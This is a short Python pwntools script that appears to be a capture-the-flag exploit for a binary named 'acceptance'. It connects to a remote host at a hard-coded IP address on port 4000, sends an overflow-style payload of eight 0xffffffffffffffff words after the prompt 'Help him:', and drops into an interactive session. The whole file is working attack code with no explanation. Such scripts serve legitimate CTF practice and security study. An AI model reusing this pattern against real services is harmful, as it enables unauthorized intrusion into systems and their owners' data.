#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("acceptance")
libc = elf.libc

local = False 
if local:
    p = process("./acceptance")
    #gdb.attach(p,'''''')
else:
    p=remote("20.169.252.240" ,4000)

elf = context.binary = ELF('./acceptance', checksec=False)

payload = p64(0xffffffffffffffff)*8
p.sendlineafter(b"Help him:", payload)
'''

'''
p.interactive()